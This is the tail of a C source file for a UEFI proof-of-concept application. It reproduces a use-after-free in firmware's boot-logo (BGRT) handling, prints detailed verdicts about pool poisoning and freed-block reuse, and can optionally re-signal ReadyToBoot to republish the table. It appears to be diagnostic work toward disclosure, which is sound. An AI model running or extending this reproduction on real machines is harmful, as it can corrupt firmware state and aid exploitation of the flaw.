         (UINT32)LOGO2_BYTES, POOL_FREE_POISON);
    Rpt ("      NOT the pattern. Something overwrote the source between step [4] and the\r\n");
    Rpt ("      copy, and the only thing that ran in between is FreePool at :320.\r\n");
    if (SourceWasFree) {
      Rpt ("    - and the source address was handed back by a later AllocatePool, which\r\n");
      Rpt ("      only happens to a block that is on the free list.\r\n");
    }
    Rpt ("  0x%02x is PcdDebugClearMemoryValue. Read the inference the right way round:\r\n", POOL_FREE_POISON);
    Rpt ("  DxeCore poisons a pool block on free (Pool.c:789) AND on allocate\r\n");
    Rpt ("  (Pool.c:538), so 0x%02x in the destination does not by itself prove which\r\n", POOL_FREE_POISON);
    Rpt ("  write put it there. What it does prove is that the pattern is gone: had the\r\n");
    Rpt ("  source still held the pattern, CopyMem would have written the pattern over\r\n");
    Rpt ("  the allocation poison, and it did not.\r\n");
  } else if (ContentChanged) {
    Rpt ("VERDICT: REPRODUCED-OBSERVED\r\n");
    Rpt ("  The copy read memory that is not what this PoC wrote: the destination\r\n");
    Rpt ("  (0x%016lx) is a different block from the source (0x%016lx), and the\r\n",
         (UINT64)(UINTN)After, (UINT64)(UINTN)Held);
    Rpt ("  copied bytes stop matching the pattern at offset %u. The bytes are not the\r\n", (UINT32)Mismatch);
    Rpt ("  pool free poison either, so what landed there is some other heap content --\r\n");
    Rpt ("  see the hex dump above.\r\n");
  } else {
    Rpt ("VERDICT: REPRODUCED-UNCHANGED\r\n");
    Rpt ("  The free-then-read sequence executed and the source was a different block\r\n");
    Rpt ("  from the destination (0x%016lx vs 0x%016lx), so the copy's source was not\r\n",
         (UINT64)(UINTN)Held, (UINT64)(UINTN)After);
    Rpt ("  its own allocation -- it was a block this driver had just freed.\r\n");
    if (SourceWasFree) {
      Rpt ("  A later AllocatePool handed that same address back, which confirms it was\r\n");
      Rpt ("  on the free list.\r\n");
    }
    Rpt ("  The bytes themselves are unchanged, so this build does not poison freed pool\r\n");
    Rpt ("  memory (PcdDebugPropertyMask bit 0x08 clear) and nothing was interleaved\r\n");
    Rpt ("  between the free and the read. The use-after-free is real; its content is not\r\n");
    Rpt ("  observably corrupted on this firmware.\r\n");
  }

  //
  // 10. The OS-visible half. The bytes the copy produced are now mLogoBltBuffer, and
  //     BgrtReadyToBootEventNotify turns mLogoBltBuffer into the BGRT image at :484/:503.
  //     That only happens at ReadyToBoot, which BDS already signalled before this
  //     application was launched.
  //
  Rpt ("\r\n");
  Rpt ("The logo the firmware now holds is published to the ACPI BGRT at the next\r\n");
  Rpt ("ReadyToBoot (BootGraphicsResourceTableDxe.c:484 and :503).\r\n");

  if (RepublishRequested (ImageHandle)) {
    Rpt ("[10] \\BL2UAF.RTB is present, so ReadyToBoot is signalled here. Every\r\n");
    Rpt ("     ReadyToBoot notification in this firmware runs a second time -- see the\r\n");
    Rpt ("     README before doing this on real hardware.\r\n");
    EfiSignalEventReadyToBoot ();
    Rpt ("     signalled.\r\n");
  } else {
    Rpt ("[10] \\BL2UAF.RTB is absent, so no event is signalled and the table below is\r\n");
    Rpt ("     still the one published before this run. Boot anything else, or run this\r\n");
    Rpt ("     application again from a shell, and it is rebuilt from the bytes above.\r\n");
  }

  ReportBgrt ("after");

  Rpt ("\r\n");
  Rpt ("=== end ==============================================================\r\n");
  Rpt ("\r\n");

  FreePool (Mine);
  WriteLogFile (ImageHandle);

  return EFI_SUCCESS;
}
